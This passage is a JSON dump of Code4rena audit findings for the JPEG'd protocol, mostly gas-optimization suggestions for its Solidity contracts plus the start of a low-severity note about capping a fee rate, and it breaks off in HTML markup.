      "content": "\nSee `@audit` tag:\n\n```solidity\n273:     function withdraw(uint256 _amount) external onlyController {\n...\n279:         if (balance < _amount)\n280:             convexConfig.baseRewardPool.withdrawAndUnwrap(\n281:                 _amount - balance, //@audit gas: should be unchecked (can't underflow due to L279)\n282:                 false\n283:             );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-26-strategypusdconvexwithdraw-l281-should-be-unchecked-due-to-l279",
      "tags": [],
      "finders": []
    },
    {
      "id": "5335",
      "title": "[G-25] `StrategyPUSDConvex.balanceOfJPEG()`: use a `return` statement instead of `break`",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) {\n234:                 availableBalance += extraReward.earned();\n235:                 //we found jpeg, no need to continue the loop\n236:                 break; //@audit gas: instead of adding to availableBalance & breaking, just return here \"availableBalance + extraReward.earned()\"\n237:             }\n238:         }\n239: \n240:         return availableBalance;\n241:     }\n```\n\nHere, instead of making a memory operation with `availableBalance += extraReward.earned();` and then using `break;` before returning the memory variable `availableBalance`, it would've been more optimized to just return `availableBalance + extraReward.earned()`:\n\n```solidity\n    function balanceOfJPEG() external view returns (uint256) {\n...\n        for (uint256 i = 0; i < length; i++) {\n...\n            if (address(jpeg) == extraReward.rewardToken()) {\n              return availableBalance + extraReward.earned();\n            }\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-25-strategypusdconvexbalanceofjpeg-use-a-return-statement-instead-of-break",
      "tags": [],
      "finders": []
    },
    {
      "id": "5334",
      "title": "[G-24] `StrategyPUSDConvex.balanceOfJPEG()`: `jpeg` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n227:         uint256 availableBalance = jpeg.balanceOf(address(this)); //@audit gas: SLOAD 1 jpeg\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) { //@audit gas: SLOADs in Loop for jpeg. Cache it at L227\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-24-strategypusdconvexbalanceofjpeg-jpeg-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5333",
      "title": "[G-23] `Controller.setStrategy()`: boolean comparison L87",
      "impact": "GAS",
      "content": "\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(directValue)` instead of `if(directValue == true)` and `if(!directValue)` instead of `if(directValue == false)` here (see `@audit` tag):\n\n```solidity\n82:     function setStrategy(IERC20 _token, IStrategy _strategy)\n83:         external\n84:         onlyRole(STRATEGIST_ROLE)\n85:     {\n86:         require(\n87:             approvedStrategies[_token][_strategy] == true, //@audit gas: instead of comparing to a constant, just use \"approvedStrategies[_token][_strategy]\"\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-23-controllersetstrategy-boolean-comparison-l87",
      "tags": [],
      "finders": []
    },
    {
      "id": "5332",
      "title": "[G-22] `NFTVault.repay()`: `totalDebtPortion` and `totalDebtAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n784:         uint256 minusPortion = paidPrincipal == debtPrincipal\n785:             ? position.debtPortion\n786:             : (totalDebtPortion * _amount) / totalDebtAmount; //@audit gas: SLOADs 1 totalDebtPortion & totalDebtAmount\n787: \n788:         totalDebtPortion -= minusPortion; //@audit gas: SLOAD 2 totalDebtPortion (could've used cached value for calculation)\n...\n791:         totalDebtAmount -= _amount; //@audit gas: SLOAD 2 totalDebtAmount (could've used cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-22-nftvaultrepay-totaldebtportion-and-totaldebtamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5331",
      "title": "[G-21] `NFTVault.repay()`: L781 should be unchecked due to ternary operator",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n780:         uint256 paidPrincipal = _amount > debtInterest\n781:             ? _amount - debtInterest //@audit gas: should be unchecked (obviously)\n782:             : 0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-21-nftvaultrepay-l781-should-be-unchecked-due-to-ternary-operator",
      "tags": [],
      "finders": []
    },
    {
      "id": "5330",
      "title": "[G-20] `NFTVault.borrow()`: `totalDebtPortion` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n675:     function borrow(\n...\n735:         if (totalDebtPortion == 0) {  //@audit gas: SLOAD 1 totalDebtPortion\n...\n738:         } else {\n739:             uint256 plusPortion = (totalDebtPortion * _amount) / //@audit gas: SLOAD 2 totalDebtPortion\n740:                 totalDebtAmount;\n741:             totalDebtPortion += plusPortion; //@audit gas: SLOAD 3 totalDebtPortion (could've used cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-20-nftvaultborrow-totaldebtportion-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5329",
      "title": "[G-19] `NFTVault.showPosition()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it (`positions[_nftIndex]`)",
      "impact": "GAS",
      "content": "\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nHere, instead of repeatedly calling `positions[_nftIndex]`, save its reference like this: `Position storage _position = positions[_nftIndex]` and use it.\n\nImpacted lines (see `@audit` tags):\n\n```solidity\n  636:         uint256 debtPrincipal = positions[_nftIndex].debtPrincipal; //@audit gas: use the suggested storage variable \"Position storage _position\"\n  637:         uint256 debtAmount = positions[_nftIndex].liquidatedAt > 0 //@audit gas: use the suggested storage variable \"Position storage _position\"\n  638:             ? positions[_nftIndex].debtAmountForRepurchase //@audit gas: use the suggested storage variable \"Position storage _position\"\n  641:                 positions[_nftIndex].debtPortion, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  660:             borrowType: positions[_nftIndex].borrowType, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 && //@audit gas: use the suggested storage variable \"Position storage _position\"\n  663:             liquidatedAt: positions[_nftIndex].liquidatedAt, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  664:             liquidator: positions[_nftIndex].liquidator //@audit gas: use the suggested storage variable \"Position storage _position\"\n```\n\nThis practice already exists in the solution, as seen in `NFTVault.borrow()`:\n\n```solidity\n675:     function borrow(\n...\n697:         Position storage position = positions[_nftIndex];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-19-nftvaultshowposition-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it-positions_nftindex",
      "tags": [],
      "finders": []
    },
    {
      "id": "5328",
      "title": "[G-18] `NFTVault.showPosition()`: `positions[_nftIndex].liquidatedAt` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 &&  //@audit gas: SLOAD 1 positions[_nftIndex].liquidatedAt\n662:                 debtAmount >= _getLiquidationLimit(_nftIndex),\n663:             liquidatedAt: positions[_nftIndex].liquidatedAt,  //@audit gas: SLOAD 2 positions[_nftIndex].liquidatedAt\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-18-nftvaultshowposition-positions_nftindexliquidatedat-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5327",
      "title": "[G-17] `NFTVault.showPosition()`: L659 should be unchecked due to L649",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n649:         if (debtPrincipal > debtAmount) debtAmount = debtPrincipal;\n...\n659:             debtInterest: debtAmount - debtPrincipal, //@audit gas: should be unchecked (can't underflow due to L649)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-17-nftvaultshowposition-l659-should-be-unchecked-due-to-l649",
      "tags": [],
      "finders": []
    },
    {
      "id": "5326",
      "title": "[G-16] `NFTVault.sol`: `struct PositionPreview` can be tightly packed to save 1 storage slot",
      "impact": "GAS",
      "content": "\nFrom (see `@audit` tags):\n\n```solidity\n610:     struct PositionPreview { // @audit gas: can be tightly packed by moving borrowType and liquidatable at the end\n611:         address owner;\n612:         uint256 nftIndex;\n613:         bytes32 nftType;\n614:         uint256 nftValueUSD;\n615:         VaultSettings vaultSettings;\n616:         uint256 creditLimit;\n617:         uint256 debtPrincipal;\n618:         uint256 debtInterest; // @audit gas: 32 bytes\n619:         BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n620:         bool liquidatable; // @audit gas: 1 byte\n621:         uint256 liquidatedAt; // @audit gas: 32 bytes\n622:         address liquidator; // @audit gas: 20 bytes\n623:     }\n```\n\nTo:\n\n```solidity\n    struct PositionPreview {\n        address owner;\n        uint256 nftIndex;\n        bytes32 nftType;\n        uint256 nftValueUSD;\n        VaultSettings vaultSettings;\n        uint256 creditLimit;\n        uint256 debtPrincipal;\n        uint256 debtInterest; // @audit gas: 32 bytes\n        uint256 liquidatedAt; // @audit gas: 32 bytes\n        BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n        bool liquidatable; // @audit gas: 1 byte\n        address liquidator; // @audit gas: 20 bytes\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-16-nftvaultsol-struct-positionpreview-can-be-tightly-packed-to-save-1-storage-slot",
      "tags": [],
      "finders": []
    },
    {
      "id": "5325",
      "title": "[G-15] `NFTVault._calculateAdditionalInterest()`: `totalDebtAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n578:     function _calculateAdditionalInterest() internal view returns (uint256) {\n...\n585:         if (totalDebtAmount == 0) {  //@audit gas: SLOAD 1 totalDebtAmount\n586:             return 0;\n587:         }\n588: \n589:         // Accrue interest\n590:         uint256 interestPerYear = (totalDebtAmount *  //@audit gas: SLOAD 2 totalDebtAmount\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-15-nftvault_calculateadditionalinterest-totaldebtamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5324",
      "title": "[G-14] `NFTVault._normalizeAggregatorAnswer()`: return statement should be unchecked",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n454:     function _normalizeAggregatorAnswer(IAggregatorV3Interface aggregator)\n455:         internal\n456:         view\n457:         returns (uint256)\n458:     {\n...\n464:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow)\n465:             decimals > 18\n466:                 ? uint256(answer) / 10**(decimals - 18)\n467:                 : uint256(answer) * 10**(18 - decimals);\n468:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-14-nftvault_normalizeaggregatoranswer-return-statement-should-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5323",
      "title": "[G-13] `FungibleAssetVaultForDAO.withdraw()`: `collateralAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");  //@audit gas: SLOAD 1 collateralAmount\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: SLOAD 2 collateralAmount\n197:         require(creditLimit >= debtAmount, \"insufficient_credit\");\n198: \n199:         collateralAmount -= amount; //@audit gas: SLOAD 3 collateralAmount (could've used the a cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-13-fungibleassetvaultfordaowithdraw-collateralamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5322",
      "title": "[G-12] `FungibleAssetVaultForDAO.withdraw()`: L196 should be unchecked due to L194",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: should be unchecked (can't underflow due to L194)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-12-fungibleassetvaultfordaowithdraw-l196-should-be-unchecked-due-to-l194",
      "tags": [],
      "finders": []
    },
    {
      "id": "5321",
      "title": "[G-11] `FungibleAssetVaultForDAO.repay)`: L184 should be unchecked due to L182",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n179:     function repay(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n180:         require(amount > 0, \"invalid_amount\");\n181: \n182:         amount = amount > debtAmount ? debtAmount : amount;\n183: \n184:         debtAmount -= amount; //@audit gas: should be unchecked (can't underflow due to L182)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-11-fungibleassetvaultfordaorepay-l184-should-be-unchecked-due-to-l182",
      "tags": [],
      "finders": []
    },
    {
      "id": "5320",
      "title": "[G-10] `FungibleAssetVaultForDAO.deposit()`: `collateralAsset` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n141:     function deposit(uint256 amount) external payable onlyRole(WHITELISTED_ROLE) {\n142:         require(amount > 0, \"invalid_amount\");\n143: \n144:         if (collateralAsset == ETH) {  //@audit gas: SLOAD 1 collateralAsset\n145:             require(msg.value == amount, \"invalid_msg_value\");\n146:         } else {\n147:             require(msg.value == 0, \"non_zero_eth_value\");\n148:             IERC20Upgradeable(collateralAsset).safeTransferFrom(  //@audit gas: SLOAD 2 collateralAsset\n149:                 msg.sender,\n150:                 address(this),\n151:                 amount\n152:             );\n153:         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-10-fungibleassetvaultfordaodeposit-collateralasset-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5319",
      "title": "[G-09] `FungibleAssetVaultForDAO._collateralPriceUsd()`: return statement should be unchecked",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n...\n111:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow here)\n112:             decimals > 18\n113:                 ? uint256(answer) / 10**(decimals - 18)  \n114:                 : uint256(answer) * 10**(18 - decimals);  \n115:     }\n```\n\nDue to the ternary condition and the fact that `int256 answer = oracle.latestAnswer();`, the return statement can't underflow and should be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-09-fungibleassetvaultfordao_collateralpriceusd-return-statement-should-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5318",
      "title": "[G-08] `FungibleAssetVaultForDAO._collateralPriceUsd()`: `oracle` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n105:         int256 answer = oracle.latestAnswer();  //@audit gas: SLOAD 1 oracle\n106:         uint8 decimals = oracle.decimals();  //@audit gas: SLOAD 2 oracle\n107: \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-08-fungibleassetvaultfordao_collateralpriceusd-oracle-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5317",
      "title": "[G-07] `JPEGLock.unlock()`: use `storage` instead of copying struct in memory L69",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n68:     function unlock(uint256 _nftIndex) external nonReentrant {\n69:         LockPosition memory position = positions[_nftIndex]; //@audit gas: costing 3 SLOADs while only lockAmount is needed twice. Replace \"memory\" with \"storage\" and cache only position.lockAmount \n70:         require(position.owner == msg.sender, \"unauthorized\");\n71:         require(position.unlockAt <= block.timestamp, \"locked\");\n72: \n73:         delete positions[_nftIndex];\n74: \n75:         jpeg.safeTransfer(msg.sender, position.lockAmount);\n76: \n77:         emit Unlock(msg.sender, _nftIndex, position.lockAmount);\n78:     }\n```\n\nHere, a copy in memory is costing 3 SLOADs and 3 MSTORES. The, 2 variables are only read once through MLOAD (`position.owner` and `position.unlockAt`) and one is read twice (`position.lockAmount`).\nI suggest replacing the `memory` keyword with `storage` at L69 and only copying `position.lockAmount` in memory.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-07-jpeglockunlock-use-storage-instead-of-copying-struct-in-memory-l69",
      "tags": [],
      "finders": []
    },
    {
      "id": "5316",
      "title": "[G-06] `yVaultLPFarming._withdrawReward()`: `accRewardPerShare` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n177:     function _withdrawReward(address account) internal returns (uint256) {\n178:         uint256 pending = (balanceOf[account] *\n179:             (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36; //@audit gas: SLOAD 1 accRewardPerShare\n180: \n181:         if (pending > 0) userPendingRewards[account] += pending;\n182: \n183:         userLastAccRewardPerShare[account] = accRewardPerShare; //@audit gas: SLOAD 2 accRewardPerShare\n184: \n185:         return pending;\n186:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-06-yvaultlpfarming_withdrawreward-accrewardpershare-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5315",
      "title": "[G-05] `yVaultLPFarming.withdraw()`: L124 should be unchecked due to L119",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n117:     function withdraw(uint256 _amount) external noContract(msg.sender) {\n118:         require(_amount > 0, \"invalid_amount\");\n119:         require(balanceOf[msg.sender] >= _amount, \"insufficient_amount\");\n120: \n121:         _update();\n122:         _withdrawReward(msg.sender);\n123: \n124:         balanceOf[msg.sender] -= _amount;  //@audit gas: should be unchecked (can't underflow due to L119)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-05-yvaultlpfarmingwithdraw-l124-should-be-unchecked-due-to-l119",
      "tags": [],
      "finders": []
    },
    {
      "id": "5314",
      "title": "[G-04] `LPFarming._withdrawReward()`: `poolInfo[_pid].accRewardPerShare` should get cached",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, the storage value should get cached in memory (see the `@audit` tags for further details):\n\n```solidity\n315:     function _withdrawReward(uint256 _pid) internal returns (uint256) {\n316:         UserInfo storage user = userInfo[_pid][msg.sender];\n317:         uint256 pending = (user.amount *\n318:             (poolInfo[_pid].accRewardPerShare - user.lastAccRewardPerShare)) / //@audit gas: SLOAD 1 poolInfo[_pid].accRewardPerShare\n319:             1e36;\n320:         if (pending > 0) {\n321:             userRewards[msg.sender] += pending;\n322:         }\n323: \n324:         user.lastAccRewardPerShare = poolInfo[_pid].accRewardPerShare; //@audit gas: SLOAD 2 poolInfo[_pid].accRewardPerShare\n325: \n326:         return pending;\n327:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-04-lpfarming_withdrawreward-poolinfo_pidaccrewardpershare-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5313",
      "title": "[G-03] `LPFarming.withdraw()`: L248 should be unchecked due to L243",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n235:     function withdraw(uint256 _pid, uint256 _amount)\n236:         external\n237:         noContract(msg.sender)\n238:     {\n239:         require(_amount > 0, \"invalid_amount\");\n240: \n241:         PoolInfo storage pool = poolInfo[_pid];\n242:         UserInfo storage user = userInfo[_pid][msg.sender];\n243:         require(user.amount >= _amount, \"insufficient_amount\");\n244: \n245:         _updatePool(_pid);\n246:         _withdrawReward(_pid);\n247: \n248:         user.amount -= _amount;  //@audit gas: should be unchecked (can't underflow due to L243)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-03-lpfarmingwithdraw-l248-should-be-unchecked-due-to-l243",
      "tags": [],
      "finders": []
    },
    {
      "id": "5312",
      "title": "[G-02] `LPFarming.newEpoch()`: L128 and L133 should be unchecked due to parent if/else condition",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tag):\n\n```solidity\n107:     function newEpoch(\n...\n111:     ) external onlyOwner {\n127:         if (remainingRewards > newRewards) {\n128:             jpeg.safeTransfer(msg.sender, remainingRewards - newRewards);  //@audit gas: should be unchecked (can't underflow due to L127)\n129:         } else if (remainingRewards < newRewards) {\n130:             jpeg.safeTransferFrom(\n131:                 msg.sender,\n132:                 address(this),\n133:                 newRewards - remainingRewards  //@audit gas: should be unchecked (can't underflow due to L129)\n134:             );\n135:         }\n136:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-02-lpfarmingnewepoch-l128-and-l133-should-be-unchecked-due-to-parent-ifelse-condition",
      "tags": [],
      "finders": []
    },
    {
      "id": "5311",
      "title": "[G-01] `NFTEscrow._executeTransfer()`: Cheap Contract Deployment Through Clones",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n67:     function _executeTransfer(address _owner, uint256 _idx) internal {\n68:         (bytes32 salt, ) = precompute(_owner, _idx);\n69:         new FlashEscrow{salt: salt}( //@audit gas: deployment can cost less through clones \n70:             nftAddress,\n71:             _encodeFlashEscrowPayload(_idx)\n72:         );\n73:     }\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n*   <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n*   <https://github.com/porter-finance/v1-core/pull/34>\n\nI suggest applying a similar pattern.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-01-nftescrow_executetransfer-cheap-contract-deployment-through-clones",
      "tags": [],
      "finders": []
    },
    {
      "id": "5310",
      "title": "[L-06] Fee in",
      "impact": "LOW",
      "content": "<h2 id=\"l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" aria-label=\"l 06 fee in nftvaultsetorganizationfeerateshould be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Fee in <code>NFTVault.setOrganizationFeeRate()</code>should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOrganizationFeeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">)  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">291:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">292:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DAO_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">293:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 